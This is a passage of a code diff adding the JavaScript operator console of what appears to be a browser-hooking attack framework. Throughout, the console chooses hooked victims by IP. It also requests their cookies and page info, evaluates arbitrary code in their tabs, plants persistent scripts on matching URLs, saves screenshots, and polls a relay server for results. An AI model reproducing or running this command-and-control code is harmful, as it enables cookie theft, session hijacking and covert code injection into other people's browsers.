+        sendCmd('reportpageinfo', null, {id: currentTab});
+        sendCmd('reportcookies', null, {id: currentTab});
+    });
+
+    $('#ping').click(function() {
+        sendCmd('ping');
+    });
+
+    $("#refresh-hook").click(function() {
+        refreshTabsTable([]);
+        refreshPersistentScriptList([]);
+        fillDataTemplate($('#tab-ext-info'), {});
+        sendCmd('report');
+    });
+
+    $('#screenshot-save').click(function() {
+    	if (!db) {
+    		al('No indexed DB support in your browser');
+    		return false;
+		}
+    	if (!db.objectStoreNames.contains('screenshots')) {
+    		al('Error, no screenshots store. Database not initialized?');
+    		return false;
+		}
+		var mode = window.webkitIDBTransaction ? webkitIDBTransaction.READ_WRITE : IDBTransaction.READ_WRITE;
+		var t = db.transaction(["screenshots"], mode);
+		t.objectStore('screenshots')
+			.add({
+	    		'hook': hook,
+	    		'date': new Date(),
+				'description': $('#screenshot-description').attr('value'),
+				'image': $('#screenshot').attr('src')   	
+			}).onsuccess = function() {
+		        al('Screenshot saved!')
+		        log('Screenshot saved!')
+		        $('#screenshot-modal').modal('hide');
+			};
+		t.oncomplete = function() {
+			//console.log('complete');
+		}
+		t.onerror = function() {
+			//console.log('e');
+		}
+		
+    });
+
+    $('#saved-screenshots-load').click(function() {
+    	if (!db) {
+    		al('No indexed DB support in your browser');
+    		return false;
+		}
+    	if (!db.objectStoreNames.contains('screenshots')) {
+    		al('Error, no screenshots store. Database not initialized?');
+    		return false;
+		}
+		
+        $('#saved-screenshots').html('');
+        var req = db.transaction(["screenshots"]).objectStore("screenshots").openCursor();
+        
+        req.onsuccess = function(event) {
+        	var c = event.target.result;
+        	if (!c) { // end of set
+        		return;
+			}
+            var $a = $('<a target=_blank>').attr('href', c.value.image);
+              
+			$('<img class="screenshot-saved-images">')
+				.attr('src', c.value.image)
+				.attr('title', c.value.description)
+				.appendTo($('#saved-screenshots'))				
+				.wrap($a);
+				
+			c.continue();
+		};
+    });
+
+    $(document).on('click', '#links a', function() {
+        var cmd = "location.href = " + JSON.stringify(this.href);
+        sendCmd('eval', cmd, {id: currentTab});
+        return false;
+    });
+
+    $("#tab-create-url").keydown(function(e) {
+        if (e.keyCode == '13' && this.value) {
+            sendCmd('createtab', this.value);
+        }
+    });
+
+    $('#hook-chosen').click(function() {
+        var v;
+        if (v = $('select[name="choose-hook"]').val()) {
+            hook = localStorage['lastHook'] = v;
+            $('#hook-id').text(v);
+            al('Chosen hook: ' + v);
+            updateHookName(v)
+            $('#choose-hook-modal').modal('hide');
+            if (ws) {
+                ws.send(JSON.stringify({cmd:"set-channel",ch:hook}));
+            }
+            sendCmd('report');
+        }
+        return false;
+    });
+    
+    $('#save-hook-name').click(function() {
+        var v;
+        if (v = ($('input[name="current-hook-name"]').val() || hook)) {
+            hookStorage.store(hook, 'name', v);
+            log('Chosen hook renamed: ' + hook + ' = ' + v);
+            updateHookName(v);
+            $('#current-hook-modal').modal('hide');
+        }
+        return false;
+    });
+
+    $('#choose-hook').click(function() {
+        var displayHookChoice = function(json) {
+            if (!json.length) {
+                al("No hooks present...");
+                return;
+            }
+            var $s = $('select[name="choose-hook"]').html('');
+            $s.append($('<option>').text('choose...'));
+            for (var i = 0; i < json.length; i++) {
+                var text = json[i].ch;
+                var name;
+                if(name = hookStorage.retrieve(json[i].ch, 'name')) text += ' (' + name + ')';
+                text += ' - ' + json[i].ip + ' ' + json[i].lastActive;
+                $('<option>').text(text).val(json[i].ch).appendTo($s);
+            }
+            $s.val(hook); // select current hook
+            $('#choose-hook-modal').modal('show');
+        };
+
+        if (ws) {
+            currentListCallback = displayHookChoice;
+            ws.send(JSON.stringify({cmd:"list"}));
+            //$.getJSON('/list', displayHookChoice);
+        } else {
+            $.getJSON('server-xhr.php', displayHookChoice);
+        }
+    
+        return false;
+    });
+
+    $('#current-hook').click(function() {
+        var changeHookName = function(json) {
+                if (!json.length || !hook) {
+                    al("Not connected to a Hook...");
+                    return;
+                }
+                var $s = $('select[name="current-hook"]').html('');
+                $('p[name=current-hook]')[0].innerText = "Real Name: " + hook;
+                $('#current-hook-modal').modal('show');
+                $('input[name="current-hook-name"]').val(hookStorage.retrieve(hook, 'name') || hook);
+            };
+
+        if (ws) {
+            currentListCallback = changeHookName;
+            ws.send(JSON.stringify({cmd:"list"}));
+        } else {
+            $.getJSON('server-xhr.php', changeHookName);
+        }
+
+        return false;
+    });
+
+
+    $("#add-persistent-script").submit(function() {
+        if (!hook) {
+            al('No current hook!');
+            return false;
+        }
+        var params = {};
+        $.each($(this).serializeArray(), function(index,value) {
+            params[value.name] = $.trim(value.value);
+        });
+        if (params.name == "" || params.urlmatch == "" || params.code == "") {
+            al('You need to enter name, URL match and code!');
+            return false;
+        }
+        try {
+            new RegExp(params.urlmatch);
+        } catch (e) {
+            al("Invalid RegExp syntax in URL!");
+            return false;
+        }
+
+        sendCmd('addpersistent', params);
+        $(this.elements).each(function() { $(this).val(''); });
+        return false;
+    });
+
+    $(document).on('click', '.remove-persistent-script', function() {
+        sendCmd('removepersistent', $(this).attr('data'));
+        return false;
+    });
+
+    $("#clear-persistent-scripts-log").click(function() {
+        delete localStorage['persistentLog'];
+        $("#persistent-script-log").html('');
+        return false;
+    });
+
+    $("#fix-server").click(function() {
+        if (ws) {
+            ws.send(JSON.stringify({
+                cmd: 'delete'
+            }));
+        }
+        $.get('server-xhr.php?delete=1');
+    });
+
+    if (!ws) {
+        setInterval(function() {
+            if (hook) {
+                $.getJSON('server-xhr.php?ch=' + encodeURIComponent(hook), function(json) {
+                    for (var i = 0; i < json.length; i++) {
+                        processResponse(json[i][0],hook);
+                    }
+                });
+            }
+        }, 2000);
+    }
+
+    var snippetsFile = 'snippets.xml.php';
+
+    $.get(snippetsFile, function(xml) {
+        $(xml).find('snippet').each(function() {
+            var name = $(this).attr('name');
+            var type = $(this).attr('type');
+            var code = $.trim($(this).text());
+            $('#' + type).append(
+                $('<option>')
+                .val(code)
+                .text(name)
+            );
+
+        });
+    }, 'xml');
+
+    $("#eval-snippets").change(function() {
+        var val = $(this).val();
+        if (val) {
+            $('textarea[name=eval]').val(val);
+        }
+    });
+
+    $("#persistent-snippets").change(function() {
+        var val = $(this).val();
+        if (val) {
+            $('textarea[name=code]', this.form).val(val);
+            this.options[this.selectedIndex]
+            $(':input[name=name]', this.form).val(this.options[this.selectedIndex].innerHTML);
+        }
+    });
+
+    $("#eval-ext-snippets").change(function() {
+        var val = $(this).val();
+        if (val) {
+            $('textarea[name=eval-ext]').val(val);
+        }
+    });
+
+    /*
+    // start with saved data
+    refreshTabsTable(hookStorage.getTabs(hook));
+    refreshPersistentScriptList(hookStorage.retrieve(hook, 'persistent', []));
+    refreshPersistentScriptLog(getPersistentLog());
+    fillDataTemplate($('#tab-ext-info'), hookStorage.retrieve(hook, 'info', {}));
+    al("Refreshed state from local storage");
+    */
+    $.get('README.md', function(t) { $('#readme').text(t) });
+});
+</script>
+</body>
+</html>
